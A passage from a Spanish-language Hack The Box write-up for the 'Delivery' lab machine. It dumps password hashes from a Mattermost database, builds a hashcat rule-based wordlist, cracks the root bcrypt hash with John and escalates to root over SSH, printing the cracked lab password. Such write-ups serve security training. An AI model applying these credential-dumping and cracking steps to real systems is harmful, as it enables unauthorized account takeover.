+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Password           <span style="color:#f92672">|</span> varchar(<span style="color:#ae81ff">128</span>) <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span>     <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> AuthData           <span style="color:#f92672">|</span> varchar(<span style="color:#ae81ff">128</span>) <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span> UNI <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> AuthService        <span style="color:#f92672">|</span> varchar(<span style="color:#ae81ff">32</span>)  <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span>     <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Email              <span style="color:#f92672">|</span> varchar(<span style="color:#ae81ff">128</span>) <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span> UNI <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> EmailVerified      <span style="color:#f92672">|</span> tinyint(<span style="color:#ae81ff">1</span>)   <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span>     <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Nickname           <span style="color:#f92672">|</span> varchar(<span style="color:#ae81ff">64</span>)  <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span>     <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> FirstName          <span style="color:#f92672">|</span> varchar(<span style="color:#ae81ff">64</span>)  <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span>     <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> LastName           <span style="color:#f92672">|</span> varchar(<span style="color:#ae81ff">64</span>)  <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span>     <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Position</span>           <span style="color:#f92672">|</span> varchar(<span style="color:#ae81ff">128</span>) <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span>     <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Roles              <span style="color:#f92672">|</span> text         <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span>     <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> AllowMarketing     <span style="color:#f92672">|</span> tinyint(<span style="color:#ae81ff">1</span>)   <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span>     <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Props              <span style="color:#f92672">|</span> text         <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span>     <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> NotifyProps        <span style="color:#f92672">|</span> text         <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span>     <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> LastPasswordUpdate <span style="color:#f92672">|</span> bigint(<span style="color:#ae81ff">20</span>)   <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span>     <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> LastPictureUpdate  <span style="color:#f92672">|</span> bigint(<span style="color:#ae81ff">20</span>)   <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span>     <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> FailedAttempts     <span style="color:#f92672">|</span> int(<span style="color:#ae81ff">11</span>)      <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span>     <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Locale             <span style="color:#f92672">|</span> varchar(<span style="color:#ae81ff">5</span>)   <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span>     <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Timezone           <span style="color:#f92672">|</span> text         <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span>     <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> MfaActive          <span style="color:#f92672">|</span> tinyint(<span style="color:#ae81ff">1</span>)   <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span>     <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> MfaSecret          <span style="color:#f92672">|</span> varchar(<span style="color:#ae81ff">128</span>) <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span>     <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">--------------------+--------------+------+-----+---------+-------+
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">25</span> <span style="color:#66d9ef">rows</span> <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">001</span> sec)
+</span></span></code></pre></div><p>Excelente, ahí están las columnas del usuario y su contraseña por lo que podemos obtener las credenciales, veamos si se pueden ver:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>MariaDB [mattermost]<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">select</span> Username, Password <span style="color:#66d9ef">from</span> Users;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------------------------+--------------------------------------------------------------+
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Username                         <span style="color:#f92672">|</span> Password                                                     <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------------------------+--------------------------------------------------------------+
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> surveybot                        <span style="color:#f92672">|</span>                                                              <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> c3ecacacc7b94f909d04dbfd308a9b93 <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">5</span>b785171bfb34762a933e127630c4860 <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a$10$3m0quqyvCE8Z<span style="color:#f92672">/</span>R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS<span style="color:#f92672">/</span><span style="color:#66d9ef">G</span> <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> root                             <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.<span style="color:#ae81ff">1</span>STWb4.<span style="color:#ae81ff">4</span>ScG.anuu7v0EFJwgjjO <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> ff0a21fc6fc2488195e16ea854c963ee <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> channelexport                    <span style="color:#f92672">|</span>                                                              <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> berserkw                         <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a$10$z35SPIrJtjWwpEeBwfOE..IlOzRiHMkyIdWk2tvdeDBhikWQP06Iy <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">9</span>ecfb4be145d47fda0724f697f35ffaf <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">----------------------------------+--------------------------------------------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">9</span> <span style="color:#66d9ef">rows</span> <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">000</span> sec)
+</span></span></code></pre></div><p>Muy bien, podemos ver la <strong>contraseña del Root</strong>, pero está encriptada por un tipo de hash que no conocemos, vamos a guardar el <strong>hash del Root</strong> y vamos a crackearlo.</p>
+<h3 id="Hash">Creando Diccionario con Reglas de Hashcat y Crackeando Hash de Contraseña del Usuario Root</h3>
+<p>Para crackear el hash, tenemos que saber el tipo de encriptado que se usó, para saberlo, usaremos la herramienta <strong>hashid</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashid <span style="color:#e6db74">&#39;$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO&#39;</span>
+</span></span><span style="display:flex;"><span>Analyzing <span style="color:#e6db74">&#39;$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Blowfish<span style="color:#f92672">(</span>OpenBSD<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Woltlab Burning Board 4.x 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> bcrypt
+</span></span></code></pre></div><p>El tipo de encriptado, es el que está al final. Por lo tanto, se encriptó usando <strong>bcrypt</strong>.</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Encriptación Bcrypt</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Bcrypt es una función de hash de contraseñas y derivación de claves para contraseñas basada en el cifrado Blowfish. Se supone que la función de derivación de claves es lenta, lo que dificulta la fuerza bruta de la contraseña. Tanto el sistema operativo OpenBSD como el software OpenSSH emplean este algoritmo hash.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Esto hace que sea complicado el crackear este hash, pero gracias a la pista que nos dieron y la contraseña que &ldquo;ya no usan&rdquo;, es posible que se pueda crackear.</p>
+<p>Ahora lo que haremos, será crear un diccionario con variaciones de la contraseña que menciona el <strong>Root</strong> con la herramienta <strong>hashcat</strong>.</p>
+<p>Guardemos esa contraseña en un archivo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;PleaseSubscribe!&#34;</span> &gt; passwd
+</span></span></code></pre></div><p>Para usar <strong>hashcat</strong>, te recomiendo que leas el siguiente blog:</p>
+<ul>
+<li><a href="https://jesux.es/cracking/passwords-cracking/" target="_blank">Introducción al Password Cracking</a></li>
+</ul>
+<p>Ahí, hay un apartado llamado <strong>Metodologia</strong> donde se ven como usar las reglas de <strong>hashcat</strong>. Lo interesante es esto:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Metodologia: Uso de Reglas de Hashcat</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>El uso de reglas es uno de los puntos fuertes de hashcat, ya que nos permite generar mutaciones en nuestro diccionarios. Hashcat incluye diversos archivos de reglas. Podemos destacar el archivo best64 que obtiene un buen resultado con un pequeño número de reglas.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Ahora usando <strong>hashcat</strong>, usaremos la regla <strong>best64.rule</strong> para crear variaciones de la contraseña, también usemos el parámetro <strong>&ndash;stdout</strong> para utilizar el archivo <strong>passwd</strong> que contiene la contraseña para vaya creando dichas variaciones y el resultado se guardará en <strong>diccionario.txt</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -r /usr/share/hashcat/rules/best64.rule --stdout passwd &gt; diccionario.txt
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>credentials.txt  diccionario.txt  flags.txt  hash  passwd
+</span></span></code></pre></div><p>Veamos el diccionario que se creó:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat diccionario.txt 
+</span></span><span style="display:flex;"><span>PleaseSubscribe!
+</span></span><span style="display:flex;"><span>!ebircsbuSesaelP
+</span></span><span style="display:flex;"><span>PLEASESUBSCRIBE!
+</span></span><span style="display:flex;"><span>pleaseSubscribe!
+</span></span><span style="display:flex;"><span>PleaseSubscribe!0
+</span></span><span style="display:flex;"><span>PleaseSubscribe!1
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>PleaSu
+</span></span><span style="display:flex;"><span>PlesPles
+</span></span><span style="display:flex;"><span>asP
+</span></span><span style="display:flex;"><span>PlcrPlcr
+</span></span><span style="display:flex;"><span>PcSu
+</span></span><span style="display:flex;"><span>PleasS
+</span></span><span style="display:flex;"><span>PeSubs
+</span></span></code></pre></div><p>Son bastantes variaciones, muy bien.</p>
+<p>Por último, usemos la herramienta <strong>John</strong> para crackear al fin el hash del <strong>Root</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john -w<span style="color:#f92672">=</span>diccionario.txt hash                                                     
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>bcrypt <span style="color:#f92672">[</span>Blowfish 32/64 X3<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">1024</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>PleaseSubscribe!21 <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:00:07 DONE <span style="color:#f92672">(</span>2023-05-05 14:22<span style="color:#f92672">)</span> 0.1324g/s 2.781p/s 2.781c/s 2.781C/s PleaseSubscribe!12..PleaseSubscribe!21
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>Listo, ahora autentiquemonos como el usuario Root en el <strong>servicio SSH</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh maildeliverer@10.10.10.222
+</span></span><span style="display:flex;"><span>maildeliverer@10.10.10.222<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Linux Delivery 4.19.0-13-amd64 <span style="color:#75715e">#1 SMP Debian 4.19.160-2 (2020-11-28) x86_64</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>Last login: Fri May  <span style="color:#ae81ff">5</span> 15:51:38 <span style="color:#ae81ff">2023</span> from 10.10.14.16
+</span></span><span style="display:flex;"><span>maildeliverer@Delivery:~$ su
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span>root@Delivery:/home/maildeliverer# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Por último, buscamos la flag:</p>
+<pre tabindex="0"><code>root@Delivery:/home/maildeliverer# cd /root
+root@Delivery:~# ls
+mail.sh  note.txt  py-smtp.py  root.txt
+root@Delivery:~# cat root.txt
+...
+</code></pre><p>Ya con esto, completamos la máquina. Pero ojito porque hay una nota, veámosla:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@Delivery:~# cat note.txt 
+</span></span><span style="display:flex;"><span>I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I<span style="color:#e6db74">&#39;ve seen several times.  The inspiration for the box is here: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Keep on hacking! And please don&#39;</span>t forget to subscribe to all the security streamers out there.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>- ippsec
+</span></span></code></pre></div><p>Suscribete a su canal, gran maestro <strong>Ippsec</strong>.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://forum.mattermost.com/t/solved-how-to-check-currently-installed-mattermost-server-version/3543" target="_blank" rel="noopener noreferrer">https://forum.mattermost.com/t/solved-how-to-check-currently-installed-mattermost-server-version/3543</a></li><li><a href="https://www.drivemeca.com/mattermost-linux-server/" target="_blank" rel="noopener noreferrer">https://www.drivemeca.com/mattermost-linux-server/</a></li><li><a href="https://help.dreamhost.com/hc/es/articles/214882998-Conectarse-a-una-base-de-datos-v%C3%ADa-SSH" target="_blank" rel="noopener noreferrer">https://help.dreamhost.com/hc/es/articles/214882998-Conectarse-a-una-base-de-datos-v%C3%ADa-SSH</a></li><li><a href="https://www.dragonjar.org/identificando-el-tipo-de-hash.xhtml" target="_blank" rel="noopener noreferrer">https://www.dragonjar.org/identificando-el-tipo-de-hash.xhtml</a></li><li><a href="https://ciberseguridad.com/herramientas/hashcat/#Crea_un_diccionario_con_hashes_MBD5" target="_blank" rel="noopener noreferrer">https://ciberseguridad.com/herramientas/hashcat/#Crea_un_diccionario_con_hashes_MBD5</a></li><li><a href="https://jesux.es/cracking/passwords-cracking/" target="_blank" rel="noopener noreferrer">https://jesux.es/cracking/passwords-cracking/</a></li><li><a href="https://www.skysnag.com/es/blog/what-is-bcrypt/" target="_blank" rel="noopener noreferrer">https://www.skysnag.com/es/blog/what-is-bcrypt/</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/htb-writeup-active/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Active - Hack The Box</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/htb-writeup-scriptkiddie/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">ScriptKiddie - Hack The Box</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
